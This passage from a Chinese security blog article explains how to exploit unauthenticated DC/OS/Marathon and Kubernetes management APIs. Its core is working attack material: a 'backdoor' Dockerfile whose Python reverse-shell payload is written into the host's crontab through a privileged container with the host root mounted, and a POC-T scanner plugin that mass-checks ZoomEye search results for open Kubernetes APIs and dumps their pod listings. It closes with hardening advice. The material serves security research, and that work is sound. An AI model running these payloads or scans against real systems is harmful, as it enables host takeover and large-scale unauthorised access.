exec](https://docs.mesosphere.com/1.9/monitoring/debugging/task-exec/)，测试一下执行命令（DCOS v1.6.1，DCOS CLI v1.9）：
    // 设置目标 URL
    > dcos config set core.dcos_url http://1.2.3.4
    // 根据文档创建一个描述文件
    > dcos marathon app add my-app.json
    // 在执行 my-app 执行 hostname 命令
    > dcos task exec my-app hostname
    No container found for the specified task. It might still be spinning up. Please try again.
    // 添加一个任务
    > dcos job add my-job.json
    DC/OS backend does not support metronome capabilities in this version. Must be DC/OS >= 1.8
居然不能在 `my-app` 执行命令，可能是 DCOS 版本过低所致，那如果运行一个 Docker 容器呢：
    > dcos task exec my-docker hostname
    This command is only supported for tasks launched by the Universal Container Runtime (UCR).
根据 [Universal Container Runtime
(UCR)](https://docs.mesosphere.com/1.9/deploying-services/containerizers/ucr/)，`container type` 需要指定为 `MESOS` 才能执行命令，但 UCR
是有[限制](https://docs.mesosphere.com/1.9/deploying-services/containerizers/ucr/#limitations)的：
> The UCR does not support the following: runtime privileges, Docker options,
> force pull, named ports, numbered ports, bridge networking, port mapping,
> private registries with container authentication.
所以如果使用 UCR 的话，Docker 将无法挂载外部目录。而如果使用已有的 Docker 基础镜像的话，无法执行我们需要的命令。
想了一下可以用构建自己 Docker 镜像的方法绕过。
参考 [Deploying a Docker-based
Service](https://docs.mesosphere.com/1.9/deploying-services/creating-services/deploy-docker-app/)，去 https://hub.docker.com 注册一个账号，假设用户名为
`test`，创建一个公开的 Repository: `backdoor`。
编写 `Dockerfile`：
    FROM alpine
    # 容器启动时执行命令
    CMD echo -e "* * * * * root /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n" >> /mnt/etc/crontab
构建 Docker 镜像并推送到 Docker hub：
    > docker build -t test/backdoor .
    > docker login
    > docker push test/backdoor
写配置文件，使用 `backdoor` 镜像且挂载宿主机根目录到 `/mnt`：
    {
        "id": "backdoor",
        "container": {
        "type": "DOCKER",
        "volumes": [
            {
              "containerPath": "/mnt",
              "hostPath": "/",
              "mode": "RW"
            }
          ],
        "docker": {
              "image": "test/backdoor",
              "network": "BRIDGE",
              "privileged": true
            }
        },
        "acceptedResourceRoles": ["slave_public"],
        "instances": 1,
        "cpus": 1,
        "mem": 1024
    }
最后添加容器到 Marathon：`dcos marathon app add backdoor.json`。
稍等片刻获得反弹的 shell：
#### 0x04 批量验证
以 Kubernetes 为例，用 [POC-T](https://github.com/Xyntax/POC-T) 可以很方便地从 `Zoomeye` 的
API 获取数据并进行验证。写一个插件试试：
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    # project = https://github.com/Xyntax/POC-T
    # author =  Oritz
    """
    Kubernetes api 未授权访问
    需要安装 kubectl
      curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.6.1/bin/linux/amd64/kubectl
      chmod +x ./kubectl
      sudo mv ./kubectl /usr/local/bin/kubectl
    Usage:
      python POC-T.py -s kubernetes-unauth -aZ "healthz metrics country:cn" --limit 1000
    """
    import subprocess
    import requests
    from plugin.useragent import firefox
    def poc(url):
        if '://' not in url:
            url = 'http://' + url
        if '443' in url:
            url = url.replace('http:', 'https:')
        try:
            g = requests.get(url, headers={'User-Agent': firefox()}, timeout=3, verify=False)
            if g.status_code is 200 and 'healthz' in g.content and 'metrics' in g.content:
                pods = subprocess.Popen("kubectl -s %s get pods --all-namespaces=true -o=wide" % url,
                                        stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=open("/dev/null", "w"), shell=True)
                output = pods.communicate()[0].decode("utf-8")
                if "Please enter Username" not in output and "Error from server" not in output:
                    with open("k8s.txt", "a") as f:
                        f.write(url + "\n" + output + "\n")
                    return url
        except Exception:
            pass
        return False
部分结果放在了 gist
上：[k8s.cn.txt](https://gist.github.com/Oritz/cef2d915397cd8211300adb519325dbf)
#### 0x05 偶遇挖矿
在研究过程中发现了部分未授权的 DCOS 被用来挖矿，如查看 DCOS 的任务日志：
在 Zookeeper 的任务配置里也可以看到：
图中的命令和常见的批量扫描主机漏洞并植入挖矿软件的程序很像，所以不大可能是管理员自己运行的。 不过查了一下 Github 上其实早就有开源的[基于
Mesos 的分布式比特币挖矿程序](https://github.com/derekchiang/Mesos-Bitcoin-Miner/)了，因为容器管理平台的资源一般都很充裕，可能会成为矿工们的新目标。
#### 0x06 总结
文中主要介绍了 Kubernetes 和 Mesos
未授权漏洞的利用方式和获得宿主机权限的攻击方式。容器管理平台未授权访问不仅会泄露容器中的代码、数据库等敏感文件，还有可能导致宿主机被控制进入内网，产生更大的危害。
参考 [Security Best Practices for Kubernetes
Deployment](http://blog.kubernetes.io/2016/08/security-best-practices-kubernetes-deployment.html)，在安装和运行容器管理平台时，遵循以下几点可提高安全性：
  * 配置防火墙，禁止敏感端口对外开放
  * 对管理端口加上认证
  * 使用安全的镜像（私有镜像仓库）
  * 设置容器资源限额
  * 容器以非 root 用户运行
文中还有两个问题没有解决：
  * Apache Mesos 如何挂载宿主机目录
  * DCOS 在容器中执行命令是否有更好的方式
如果有意见和建议，欢迎提出。
#### 0x07 参考
  * [容器集群管理工具各项对比](https://segmentfault.com/a/1190000005185138)
  * [巅峰对决之 Swarm、Kubernetes、Mesos](http://dockone.io/article/1138)
  * [Docker Remote API 未授权访问漏洞利用](http://joychou.org/index.php/web/docker-remote-api-unauthorized-access.html)
  * [Security Best Practices for Kubernetes Deployment](http://blog.kubernetes.io/2016/08/security-best-practices-kubernetes-deployment.html)
* * *